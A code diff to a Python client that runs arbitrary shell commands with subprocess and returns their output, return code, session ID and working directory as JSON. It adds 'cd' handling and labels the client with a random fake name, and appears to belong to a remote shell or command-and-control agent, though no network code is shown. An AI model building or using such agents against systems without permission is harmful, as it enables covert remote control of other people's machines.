@@ -1,5 +1,4 @@
 
-import re
 import subprocess
 import datetime
 import os
@@ -31,13 +30,47 @@ start_timer = True
 
 payload = {
     'client_ID': fake.name(),
-    'password': str(datetime.datetime.now())[:-7],
+    'connection_timestamp': str(datetime.datetime.now())[:-7],
+    'working_directory': os.getcwd(),
+    'latest_command': '',
 }
 
 
 def execute_command(command):
 
     execution_timestamp = str(datetime.datetime.now())[:-7]
+    working_directory = os.getcwd()
+
+    # Making cd work
+    command = command.lstrip()
+    if 'cd' in command[:2]:
+
+        relative_path = command[2:].strip()
+        path_change_error = 'No such file or directory'
+        path_change_message = ''
+        path_change_return_code = 126
+
+        if os.path.exists(relative_path):
+            os.chdir(relative_path)
+            payload['working_directory'] = os.getcwd()
+            path_change_error = ''
+            path_change_message = 'Working directory changed successfully.'
+            path_change_return_code = 0
+
+        return json.dumps({
+            'stderr': path_change_error,
+            'stdout': path_change_message,
+            'return_code': path_change_return_code,
+            'return_code_meaning': STATUS_CODE[str(path_change_return_code)],
+            'session_ID': payload['client_Session_ID'],
+            'execution_timestamp': execution_timestamp,
+            'working_directory': working_directory,
+            'latest_command': command,
+        }
+        )
+
+    os.chdir(payload['working_directory'])
+
     proc = subprocess.Popen(command,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
@@ -62,7 +95,9 @@ def execute_command(command):
         'return_code': return_code,
         'return_code_meaning': STATUS_CODE[str(return_code)],
         'session_ID': payload['client_Session_ID'],
-        'execution_timestamp': execution_timestamp
+        'execution_timestamp': execution_timestamp,
+        'working_directory': payload['working_directory'],
+        'latest_command': command,
     }
 
     print(client_response)
